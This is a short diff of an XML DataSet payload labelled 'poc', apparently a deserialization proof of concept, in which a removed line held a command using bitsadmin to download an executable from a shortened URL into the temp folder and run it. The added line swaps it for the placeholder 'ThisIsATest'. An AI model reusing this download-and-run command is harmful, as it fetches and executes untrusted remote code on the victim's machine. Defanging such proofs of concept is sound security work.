@@ -3,7 +3,7 @@
     <bar diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
       <poc xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
         <TestWrapper>
-          <Info>&lt;Info&gt;/c bitsadmin /transfer myjob /download /priority normal https://tinyurl.com/Pr0cm0n %TEMP%\Procmon.exe &amp;&amp; %TEMP%\Procmon.exe&lt;/Info&gt;</Info>
+          <Info>ThisIsATest</Info>
           <Timestamp>2025-10-11T04:15:55Z</Timestamp>
         </TestWrapper>
       </poc>
